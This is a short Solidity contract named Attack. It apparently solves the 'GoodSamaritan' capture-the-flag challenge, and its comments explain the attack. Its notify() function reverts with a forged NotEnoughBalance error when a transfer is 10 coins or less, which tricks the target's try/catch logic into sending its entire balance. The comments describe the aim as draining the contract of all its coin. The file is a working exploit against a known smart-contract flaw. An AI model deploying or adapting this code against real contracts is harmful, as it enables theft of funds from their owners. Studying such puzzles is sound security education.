// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

error NotEnoughBalance();

contract Attack {
    // declare a goodSamaritan contract
    IGoodSamaritan goodSamaritan;

    constructor(address _goodSamaritan) payable {
        // connect our attack contract to the goodsamaritan contract
        goodSamaritan = IGoodSamaritan(_goodSamaritan);
    }

    // request a donation
    // this function flows as follows
    // requestDonation() >>> wallet.donate10(msg.sender) >>> coin.transfer(dest_, 10) >>> INotifyable(dest_).notify(amount_)
    // This gives us the oppurtunity to create a notify() function that triggers our exploit
    function requestDonation() external {
        goodSamaritan.requestDonation();
    }

    // This function throws a NotEnoughBalance() when the amount arg in coin.transfer() is <= 10
    // This error bubbles up to the catch block condition in our requestDonation() function
    // Its satisfies the catch condition and drain the goodSamaritan of all its coin
    function notify(uint256 _amount) external pure {
        if (_amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
